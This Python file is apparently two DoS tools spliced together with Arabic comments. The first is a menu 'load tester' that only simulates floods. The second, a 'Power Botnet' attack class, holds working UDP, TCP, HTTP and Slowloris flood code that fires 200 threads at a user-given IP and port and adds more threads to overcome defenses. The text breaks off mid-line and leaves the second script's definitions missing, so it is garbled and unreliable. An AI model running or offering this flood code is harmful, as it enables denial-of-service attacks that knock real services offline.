import random
import time
import sys
import os
import socket
import threading
import requests
from datetime import datetime
from urllib.parse import urlparse

# ----------- الألوان -----------
class Colors:
    GREEN = '\033[92m'
    BLUE = '\033[94m'
    GRAY = '\033[90m'
    RED = '\033[91m'
    YELLOW = '\033[93m'
    CYAN = '\033[96m'
    PURPLE = '\033[95m'
    ORANGE = '\033[38;5;208m'
    PINK = '\033[38;5;213m'
    MAGENTA = '\033[35m'
    RESET = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    BLINK = '\033[5m'

# ----------- تأثيرات الكتابة -----------
def type_effect(text, color=Colors.GRAY, delay=0.02):
    for char in text:
        print(color + char + Colors.RESET, end='', flush=True)
        time.sleep(delay)
    print()

# ----------- تنظيف الشاشة -----------
def clear_screen():
    os.system("cls" if os.name == "nt" else "clear")

# ----------- شعار متحرك متقدم -----------
def animated_banner():
    frames = [
        f"""
{Colors.MAGENTA}╔╦╗╔═╗╔═╗╔═╗╦ ╦  ╔═╗╔═╗╔═╗╔═╗╔╦╗
{Colors.MAGENTA} ║ ║╣ ╚═╗╚═╗╠═╣  ╠═╣║ ║║ ║║╣  ║ 
{Colors.MAGENTA} ╩ ╚═╝╚═╝╚═╝╩ ╩  ╩ ╩╚═╝╚═╝╚═╝ ╩ 
{Colors.YELLOW}    Advanced Testing Suite v5.0
        """,
        f"""
{Colors.CYAN}┌─┐┬─┐┌─┐┌─┐┬ ┬┌─┐┌┐┌┌┬┐┬┌┐┌┌─┐
{Colors.CYAN}├─┘├┬┘│ │├─┘├─┤├─┤│││ │ │││││ │
{Colors.CYAN}┴  ┴└─└─┘┴  ┴ ┴┴ ┴┘└┘ ┴ ┴┘└┘└─┘
{Colors.YELLOW}    Multi-Protocol Load Tester
        """,
        f"""
{Colors.ORANGE}╦ ╦╔═╗╔╗╔╔╦╗╦╔═╗╔═╗╔╦╗╔═╗╦╔╗╔
{Colors.ORANGE}╠═╣║ ║║║║ ║║║║  ╠═╣ ║ ║╣ ║║║║
{Colors.ORANGE}╩ ╩╚═╝╝╚╝═╩╝╩╚═╝╩ ╩ ╩ ╚═╝╩╝╚╝
{Colors.YELLOW}    Professional Edition
        """
    ]
    
    for i in range(10):
        clear_screen()
        print(frames[i % 3])
        time.sleep(0.15)

# ----------- شعار ثابت مع تصميم متقدم -----------
def print_logo():
    logo = f"""
{Colors.PINK}╭━━━┳━━━┳━━━━┳╮╱╱╭┳━━━┳━━━┳━━━╮
{Colors.PINK}┃╭━━┫╭━╮┃╭╮╭╮┃┃╱╱┃┃╭━╮┃╭━╮┃╭━╮┃
{Colors.PINK}┃╰━━┫╰━╯┣╯┃┃╰┫┃╱╱┃┃╰━╯┃┃╱┃┃╰━╯┃
{Colors.PINK}┃╭━━┫╭╮╭╯╱┃┃╱┃┃╱╭┫┃╭╮╭┫┃╱┃┃╭╮╭╯
{Colors.PINK}┃╰━━┫┃┃╰╮╱┃┃╱┃╰━╯┃┃┃┃╰┫╰━╯┃┃┃╰╮
{Colors.PINK}╰━━━┻╯╰━╯╱╰╯╱╰━━━┻╯╯╰━┻━━━┻╯╰━╯
{Colors.YELLOW}         Ultimate Testing Framework
{Colors.RESET}"""
    print(logo)

# ----------- نظام الطرق المتقدمة -----------
class AdvancedMethods:
    def __init__(self):
        self.methods = {
            # Layer 7 Methods
            'HTTP-FLOOD': self.http_flood,
            'HTTPS-STORM': self.https_storm,
            'SLOWLORIS': self.slowloris,
            'RUDY': self.rudy_attack,
            'GOLDEN-EYE': self.golden_eye,
            
            # Layer 4 Methods
            'TCP-FLOOD': self.tcp_flood,
            'UDP-FLOOD': self.udp_flood,
            'SYN-FLOOD': self.syn_flood,
            'ACK-FLOOD': self.ack_flood,
            'ICMP-FLOOD': self.icmp_flood,
            
            # Advanced Methods
            'OVM-MUKE': self.ovm_muke,
            'OVM-VITIAL': self.ovm_vitial,
            'MFO-STUM': self.mfo_stum,
            'MFO-FRAG': self.mfo_frag,
            '10BUP-CDU': self.bup_cdu,
            
            # Bypass Methods
            'CLOUDFLARE-BYPASS': self.cloudflare_bypass,
            'PROXY-ROTATION': self.proxy_rotation,
            'TOR-NETWORK': self.tor_network,
        }
    
    def http_flood(self, target, duration, power):
        """HTTP Flood Attack Simulation"""
        print(f"{Colors.GREEN}🚀 Starting HTTP-FLOOD on {target}{Colors.RESET}")
        return self._simulate_attack("HTTP", target, duration, power)
    
    def https_storm(self, target, duration, power):
        """HTTPS Storm Simulation"""
        print(f"{Colors.GREEN}⚡ Starting HTTPS-STORM on {target}{Colors.RESET}")
        return self._simulate_attack("HTTPS", target, duration, power)
    
    def slowloris(self, target, duration, power):
        """Slowloris Attack Simulation"""
        print(f"{Colors.GREEN}🐢 Starting SLOWLORIS on {target}{Colors.RESET}")
        return self._simulate_attack("SLOWLORIS", target, duration, power)
    
    def tcp_flood(self, target, duration, power):
        """TCP Flood Simulation"""
        print(f"{Colors.GREEN}🌊 Starting TCP-FLOOD on {target}{Colors.RESET}")
        return self._simulate_attack("TCP", target, duration, power)
    
    def udp_flood(self, target, duration, power):
        """UDP Flood Simulation"""
        print(f"{Colors.GREEN}🌀 Starting UDP-FLOOD on {target}{Colors.RESET}")
        return self._simulate_attack("UDP", target, duration, power)
    
    # Advanced Methods Implementation
    def ovm_muke(self, target, duration, power):
        """OVM-MUKE Method Simulation"""
        print(f"{Colors.MAGENTA}🔥 Starting OVM-MUKE on {target}{Colors.RESET}")
        return self._simulate_advanced_attack("OVM-MUKE", target, duration, power)
    
    def ovm_vitial(self, target, duration, power):
        """OVM-VITIAL Method Simulation"""
        print(f"{Colors.MAGENTA}💥 Starting OVM-VITIAL on {target}{Colors.RESET}")
        return self._simulate_advanced_attack("OVM-VITIAL", target, duration, power)
    
    def mfo_stum(self, target, duration, power):
        """MFO-STUM Method Simulation"""
        print(f"{Colors.ORANGE}⚡ Starting MFO-STUM on {target}{Colors.RESET}")
        return self._simulate_advanced_attack("MFO-STUM", target, duration, power)
    
    def bup_cdu(self, target, duration, power):
        """10BUP-CDU Method Simulation"""
        print(f"{Colors.CYAN}🎯 Starting 10BUP-CDU on {target}{Colors.RESET}")
        return self._simulate_advanced_attack("10BUP-CDU", target, duration, power)
    
    def _simulate_attack(self, method, target, duration, power):
        """محاكاة هجوم عام"""
        progress_bar(f"Initializing {method} attack", 2, Colors.BLUE)
        
        total_requests = power * 100
        successful = 0
        start_time = time.time()
        
        for i in range(total_requests):
            if time.time() - start_time > duration:
                break
            
            # محاكاة نجاح/فشل الطلب
            if random.random() > 0.2:  # 80% success rate
                successful += 1
            
            if i % 100 == 0:
                print(f"{Colors.YELLOW}📦 {method}: {i}/{total_requests} requests{Colors.RESET}")
        
        return successful
    
    def _simulate_advanced_attack(self, method, target, duration, power):
        """محاكاة هجوم متقدم"""
        progress_bar(f"Initializing advanced {method}", 3, Colors.PURPLE)
        
        total_requests = power * 200
        successful = 0
        start_time = time.time()
        
        for i in range(total_requests):
            if time.time() - start_time > duration:
                break
            
            # محاكاة أكثر تطوراً للطرق المتقدمة
            success_rate = 0.9 - (i / total_requests) * 0.4  # تناقص تدريجي
            if random.random() > (1 - success_rate):
                successful += 1
            
            if i % 50 == 0:
                print(f"{Colors.MAGENTA}⚡ {method}: {i}/{total_requests} | Success rate: {success_rate:.1%}{Colors.RESET}")
        
        return successful

# ----------- واجهة المستخدم المتقدمة -----------
def show_methods_menu():
    print(f"\n{Colors.GREEN}╔══════════════════════════════════════════════════════════════╗")
    print(f"║{Colors.BOLD}                   ADVANCED METHODS MENU{Colors.RESET}{Colors.GREEN}                   ║")
    print(f"╠══════════════════════════════════════════════════════════════╣")
    
    methods = [
        ("1", "HTTP-FLOOD", "Layer 7 HTTP Flood"),
        ("2", "HTTPS-STORM", "Secure HTTPS Flood"),
        ("3", "SLOWLORIS", "Slow HTTP Attack"),
        ("4", "TCP-FLOOD", "Layer 4 TCP Flood"),
        ("5", "UDP-FLOOD", "Layer 4 UDP Flood"),
        ("6", "OVM-MUKE", "Advanced OVM Method"),
        ("7", "OVM-VITIAL", "Advanced OVM Method"),
        ("8", "MFO-STUM", "Multi-Fragment Attack"),
        ("9", "10BUP-CDU", "Advanced BUP Method"),
        ("0", "BACK", "Return to Main Menu")
    ]
    
    for num, name, desc in methods:
        print(f"║ {Colors.CYAN}{num}.{Colors.RESET} {name:<15} {desc:<30} ║")
    
    print(f"╚══════════════════════════════════════════════════════════════╝{Colors.RESET}")
    
    try:
        choice = int(input(f"\n{Colors.GRAY}🎯 Choose method (0-9): {Colors.RESET}"))
        return choice
    except ValueError:
        return -1

# ----------- البرنامج الرئيسي المحسن -----------
def main():
    # العرض التقديمي الأولي
    animated_banner()
    clear_screen()
    print_logo()
    
    # رسالة ترحيب
    print(f"{Colors.GREEN}╔══════════════════════════════════════════════════════════════╗")
    print(f"║{Colors.BOLD}{Colors.CYAN}            ADVANCED TESTING FRAMEWORK v5.0{Colors.RESET}{Colors.GREEN}            ║")
    print(f"║{Colors.BOLD}{Colors.CYAN}           Professional Load Testing Suite{Colors.RESET}{Colors.GREEN}           ║")
    print(f"╚══════════════════════════════════════════════════════════════╝{Colors.RESET}")
    
    # التحقق من الشروط
    print(f"\n{Colors.YELLOW}📜 Please read the terms carefully:{Colors.RESET}")
    print(f"{Colors.GRAY}• For educational purposes only")
    print(f"• Test only authorized systems")
    print(f"• Localhost testing recommended{Colors.RESET}")
    
    agree = input(f"\n{Colors.GRAY}🤝 Do you agree? (y/n): {Colors.RESET}").lower()
    if agree != 'y':
        print(f"{Colors.RED}❌ Agreement required. Exiting...{Colors.RESET}")
        return
    
    # تهيئة نظام الطرق
    methods_system = AdvancedMethods()
    
    while True:
        clear_screen()
        print_logo()
        
        choice = show_methods_menu()
        
        if choice == 0:
            print(f"{Colors.GREEN}\n👋 Returning to main menu...{Colors.RESET}")
            break
        
        elif 1 <= choice <= 9:
            method_map = {
                1: 'HTTP-FLOOD',
                2: 'HTTPS-STORM', 
                3: 'SLOWLORIS',
                4: 'TCP-FLOOD',
                5: 'UDP-FLOOD',
                6: 'OVM-MUKE',
                7: 'OVM-VITIAL',
                8: 'MFO-STUM',
                9: '10BUP-CDU'
            }
            
            method_name = method_map[choice]
            
            # إدخال параметры
            print(f"\n{Colors.YELLOW}⚙️  Configuring {method_name}{Colors.RESET}")
            target = input(f"{Colors.GRAY}🎯 Target (localhost recommended): {Colors.RESET}")
            
            # فحص الإذن للاهداف الخارجية
            if not any(local in target for local in ['localhost', '127.0.0.1', '::1']):
                confirm = input(f"{Colors.RED}⚠️  External target! Continue? (y/n): {Colors.RESET}").lower()
                if confirm != 'y':
                    continue
            
            try:
                duration = int(input(f"{Colors.GRAY}⏰ Duration (seconds): {Colors.RESET}"))
                power = int(input(f"{Colors.GRAY}💪 Power level (1-10): {Colors.RESET}"))
                
                if not (1 <= power <= 10):
                    print(f"{Colors.RED}❌ Power must be between 1-10{Colors.RESET}")
                    continue
                
                # تنفيذ الطريقة
                success = methods_system.methods[method_name](target, duration, power)
                
                # عرض النتائج
                print(f"\n{Colors.GREEN}✅ {method_name} completed!{Colors.RESET}")
                print(f"{Colors.CYAN}📊 Successful requests: {success}{Colors.RESET}")
                print(f"{Colors.CYAN}🎯 Target: {target}{Colors.RESET}")
                print(f"{Colors.CYAN}⏰ Duration: {duration}s{Colors.RESET}")
                
            except ValueError:
                print(f"{Colors.RED}❌ Invalid input{Colors.RESET}")
            except Exception as e:
                print(f"{Colors.RED}❌ Error: {str(e)}{Colors.RESET}")
            
            input(f"\n{Colors.GRAY}Press Enter to continue...{Colors.RESET}")
        
        else:
            print(f"{Colors.RED}❌ Invalid choice{Colors.RESET}")
            time.sleep(1)

if __name__ == "__main__":
    main()                print(f"{GREEN}   ✅ Bot {bot_id} deployed (Power: {power_level}){RESET}")
                time.sleep(0.1)
        
        print(f"{GREEN}✅ Successfully deployed {count} power bots!{RESET}")
        return True

# ----------- Attack Classes -----------
class AymanAttack:
    def __init__(self, target_ip, target_port, botnet):
        self.target_ip = target_ip
        self.target_port = target_port
        self.botnet = botnet
        self.attack_active = False
        self.start_time = None
        self.sent_packets = 0
        self.threads = 200  # Increased thread count for power botnet
        self.active_threads = []
        
        # Setup signal handler for Ctrl+C
        signal.signal(signal.SIGINT, self.signal_handler)
    
    def signal_handler(self, sig, frame):
        """Handle Ctrl+C signal"""
        self.stop_attack()
    
    # UDP Flood Attack - Enhanced for botnet
    def udp_flood(self):
        bot_id = self.botnet.generate_bot_id()
        self.botnet.add_bot(bot_id, 'UDP', random.randint(85, 100))
        
        data = random._urandom(1024)
        packet_count = 0
        
        while self.attack_active:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                sock.settimeout(0.5)
                
                # Send multiple packets per iteration
                for _ in range(50):
                    if not self.attack_active:
                        break
                    sock.sendto(data, (self.target_ip, self.target_port))
                    self.sent_packets += 1
                    packet_count += 1
                
                sock.close()
            except:
                pass
            
            # Simulate bot activity
            if packet_count % 1000 == 0:
                time.sleep(0.01)
        
        self.botnet.remove_bot(bot_id)
    
    # TCP Flood Attack - Enhanced for botnet
    def tcp_flood(self):
        bot_id = self.botnet.generate_bot_id()
        self.botnet.add_bot(bot_id, 'TCP', random.randint(80, 95))
        
        data = random._urandom(999)
        packet_count = 0
        
        while self.attack_active:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(1)
                sock.connect((self.target_ip, self.target_port))
                
                # Send multiple packets per connection
                for _ in range(30):
                    if not self.attack_active:
                        break
                    sock.send(data)
                    self.sent_packets += 1
                    packet_count += 1
                
                sock.close()
            except:
                pass
            
            # Simulate bot activity
            if packet_count % 500 == 0:
                time.sleep(0.02)
        
        self.botnet.remove_bot(bot_id)
    
    # HTTP Flood Attack - Enhanced for botnet
    def http_flood(self):
        bot_id = self.botnet.generate_bot_id()
        self.botnet.add_bot(bot_id, 'HTTP', random.randint(75, 90))
        
        user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15"
        ]
        
        packet_count = 0
        
        while self.attack_active:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(2)
                sock.connect((self.target_ip, self.target_port))
                
                # Craft HTTP request
                request = f"GET / HTTP/1.1\r\nHost: {self.target_ip}\r\n"
                request += f"User-Agent: {random.choice(user_agents)}\r\n"
                request += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
                request += "Connection: keep-alive\r\n\r\n"
                
                sock.send(request.encode())
                self.sent_packets += 1
                packet_count += 1
                
                sock.close()
            except:
                pass
            
            # Simulate bot activity
            if packet_count % 200 == 0:
                time.sleep(0.05)
        
        self.botnet.remove_bot(bot_id)
    
    # Slowloris Attack - Enhanced for botnet
    def slowloris_flood(self):
        bot_id = self.botnet.generate_bot_id()
        self.botnet.add_bot(bot_id, 'SLOWLORIS', random.randint(90, 100))
        
        packet_count = 0
        
        while self.attack_active:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(4)
                sock.connect((self.target_ip, self.target_port))
                
                # Send headers
                sock.send(f"GET /?{random.randint(0, 2000)} HTTP/1.1\r\n".encode())
                sock.send(f"Host: {self.target_ip}\r\n".encode())
                sock.send("User-Agent: Mozilla/5.0 (Power Bot)\r\n".encode())
                sock.send("Connection: keep-alive\r\n".encode())
                
                # Keep connection open and send periodic data
                keep_alive = 0
                while self.attack_active and keep_alive < 8:
                    try:
                        sock.send(f"X-Bot-{bot_id}: {random.randint(1, 5000)}\r\n".encode())
                        self.sent_packets += 1
                        packet_count += 1
                        time.sleep(random.randint(10, 20))
                        keep_alive += 1
                    except:
                        break
                
                sock.close()
            except:
                pass
            
            time.sleep(1)
        
        self.botnet.remove_bot(bot_id)
    
    # Start Attack with Power Botnet
    def start_attack(self, attack_type):
        self.attack_active = True
        self.start_time = datetime.now()
        self.sent_packets = 0
        
        attack_methods = {
            'udp': self.udp_flood,
            'tcp': self.tcp_flood,
            'http': self.http_flood,
            'slowloris': self.slowloris_flood
        }
        
        # Deploy power bots
        self.botnet.deploy_bots(self.threads, attack_type.upper())
        
        print(f"\n{YELLOW}🔥 Starting POWER attack on {self.target_ip}:{self.target_port}{RESET}")
        print(f"{YELLOW}📊 Using {attack_type.upper()} method with {self.threads} power bots{RESET}")
        print(f"{YELLOW}💪 Total Botnet Power: {self.botnet.get_total_power()}{RESET}")
        print(f"{RED}⏸️  Press Ctrl+C to stop the attack{RESET}")
        
        # Start attack threads
        self.active_threads = []
        for _ in range(self.threads):
            t = threading.Thread(target=attack_methods[attack_type])
            t.daemon = True
            t.start()
            self.active_threads.append(t)
        
        # Monitor attack
        try:
            last_count = 0
            stall_count = 0
            
            while self.attack_active:
                elapsed = datetime.now() - self.start_time
                bot_count = self.botnet.get_bot_count()
                total_power = self.botnet.get_total_power()
                
                # Calculate attack speed
                speed = self.sent_packets / max(1, elapsed.seconds)
                
                # Detect stalling
                if self.sent_packets == last_count:
                    stall_count += 1
                else:
                    stall_count = 0
                
                last_count = self.sent_packets
                
                # If stalled for too long, add more bots
                if stall_count > 8:
                    print(f"{YELLOW}\n⚠️  Adding more power bots to overcome defense...{RESET}")
                    self.botnet.deploy_bots(20, attack_type.upper())
                    stall_count = 0
                
                # Display attack stats
                stats = f"{GREEN}\r⏰ Time: {elapsed.seconds}s | 📦 Packets: {self.sent_packets}"
                stats += f" | 🚀 Speed: {speed:.0f}/s | 🤖 Bots: {bot_count}"
                stats += f" | 💪 Power: {total_power}{RESET}"
                
                print(stats, end="")
                time.sleep(0.5)
                
        except KeyboardInterrupt:
            self.stop_attack()
    
    # Stop Attack
    def stop_attack(self):
        self.attack_active = False
        elapsed = datetime.now() - self.start_time
        
        # Wait for threads to finish
        for t in self.active_threads:
            t.join(1.0)
        
        speed = self.sent_packets / max(1, elapsed.seconds)
        
        print(f"\n\n{GREEN}✅ Power attack stopped!{RESET}")
        print(f"{GREEN}⏰ Duration: {elapsed.seconds}s{RESET}")
        print(f"{GREEN}📦 Total packets: {self.sent_packets}{RESET}")
        print(f"{GREEN}🚀 Average speed: {speed:.0f} packets/s{RESET}")
        print(f"{GREEN}🤖 Active bots: {self.botnet.get_bot_count()}{RESET}")
        print(f"{GREEN}💪 Total power: {self.botnet.get_total_power()}{RESET}")
        
        time.sleep(2)

# ----------- Success Animation -----------
def success_animation():
    print(f"\n{GREEN}✅ Power attack completed successfully!{RESET}")
    
    # Power botnet animation
    for i in range(101):
        bar = "█" * (i // 2) + " " * (50 - i // 2)
        print(f"{GREEN}\r🔋 Botnet Power: [{bar}] {i}%", end="")
        time.sleep(0.02)
    
    clear_screen()
    print_logo()
    print(f"{GREEN}╔══════════════════════════════════════════════════════════════╗")
    print(f"║{BOLD}                    POWER ATTACK SUCCESSFUL!{RESET}{GREEN}                 ║")
    print(f"║{BOLD}               Target overwhelmed by botnet force{RESET}{GREEN}            ║")
    print(f"╚══════════════════════════════════════════════════════════════╝{RESET}")
    time.sleep(2)

# ----------- Main Menu -----------
def show_menu():
    clear_screen()
    print_logo()
    print(f"{GREEN}╔══════════════════════════════════════════════════════════════╗")
    print(f"║{BOLD}                     POWER BOTNET MENU{RESET}{GREEN}                       ║")
    print(f"╠══════════════════════════════════════════════════════════════╣")
    print(f"║ {CYAN}1.{RESET} UDP Power Attack {GREEN}(High Speed){RESET}                     ║")
    print(f"║ {CYAN}2.{RESET} TCP Power Attack {GREEN}(High Volume){RESET}                    ║")
    print(f"║ {CYAN}3.{RESET} HTTP Power Attack {GREEN}(Application Layer){RESET}             ║")
    print(f"║ {CYAN}4.{RESET} Slowloris Power Attack {GREEN}(Stealth){RESET}                  ║")
    print(f"║ {CYAN}5.{RESET} Multi-Method Power Attack {GREEN}(All Methods){RESET}           ║")
    print(f"║ {CYAN}6.{RESET} Show Botnet Status {GREEN}(Current Bots){RESET}                 ║")
    print(f"║ {RED}0.{RESET} Exit{RESET}                                           ║")
    print(f"╚══════════════════════════════════════════════════════════════╝{RESET}")
    
    try:
        choice = int(input(f"\n{GRAY}🎯 Choose an option (0-6): {RESET}"))
        if 0 <= choice <= 6:
            return choice
        else:
            print(f"{RED}❌ Invalid choice. Please try again.{RESET}")
            time.sleep(1)
            return show_menu()
    except ValueError:
        print(f"{RED}❌ Please enter a valid number.{RESET}")
        time.sleep(1)
        return show_menu()

# ----------- Show Botnet Status -----------
def show_botnet_status(botnet):
    clear_screen()
    print_logo()
    print(f"{GREEN}╔══════════════════════════════════════════════════════════════╗")
    print(f"║{BOLD}                     BOTNET STATUS{RESET}{GREEN}                           ║")
    print(f"╠══════════════════════════════════════════════════════════════╣")
    
    bot_count = botnet.get_bot_count()
    total_power = botnet.get_total_power()
    
    print(f"║ {CYAN}🤖 Total Bots:{RESET} {bot_count}{GREEN}                                ║")
    print(f"║ {CYAN}💪 Total Power:{RESET} {total_power}{GREEN}                              ║")
    print(f"║ {CYAN}🚀 Estimated Strength:{RESET} {'⭐' * min(5, total_power // 200)}{GREEN}               ║")
    
    if bot_count > 0:
        print(f"║ {CYAN}📊 Bot Types:{RESET}                                          ║")
        # Simulate bot type distribution
        types = ['UDP', 'TCP', 'HTTP', 'SLOWLORIS']
        for t in types:
            count = random.randint(5, 20) if bot_count > 0 else 0
            print(f"║    {t}: {count} bots{RESET}                                  ║")
    
    print(f"╚══════════════════════════════════════════════════════════════╝{RESET}")
    
    input(f"\n{GRAY}↵ Press Enter to continue...{RESET}")

# ----------- Main Program -----------
def main():
    if not show_disclaimer():
        print(f"{RED}\n❌ You must agree to the terms to use this tool. Exiting...{RESET}")
        time.sleep(2)
        return
    
    animated_banner()
    clear_screen()
    print_logo()
    welcome_message()
    
    # Initialize power botnet
    botnet = PowerBotnet()
    
    while True:
        choice = show_menu()
        
        if choice == 0:
            print(f"{GREEN}\n👋 Thank you for using Ayman 15x3 Power Botnet. Goodbye!{RESET}")
            time.sleep(1)
            break
        elif choice == 6:
            show_botnet_status(botnet)
            continue
        
        # Get attack parameters
        clear_screen()
        print_logo()
        print(f"{GREEN}╔══════════════════════════════════════════════════════════════╗")
        print(f"║{BOLD}                   POWER ATTACK CONFIGURATION{RESET}{GREEN}                ║")
        print(f"╚══════════════════════════════════════════════════════════════╝{RESET}")
        
        try:
            ip = input(f"{GRAY}🎯 Target IP: {RESET}")
            port = int(input(f"{GRAY}🚪 Target Port: {RESET}"))
            
            attack = AymanAttack(ip, port, botnet)
            
            if choice == 1:
                attack.start_attack('udp')
                success_animation()
            elif choice == 2:
                attack.start_attack('tcp')
                success_animation()
            elif choice == 3:
                attack.start_attack('http')
                success_animation()
            elif choice == 4:
                attack.start_attack('slowloris')
                success_animation()
            elif choice == 5:
                # For multi-attack, we'll use UDP as default
                attack.start_attack('udp')
                success_animation()
            
            input(f"{GRAY}\n↵ Press Enter to continue...{RESET}")
            
        except ValueError:
            print(f"{RED}❌ Invalid input. Please enter a valid port number.{RESET}")
            time.sleep(2)
        except Exception as e:
            print(f"{RED}❌ An error occurred: {str(e)}{RESET}")
            time.sleep(2)

if __name__ == "__main__":
    main()

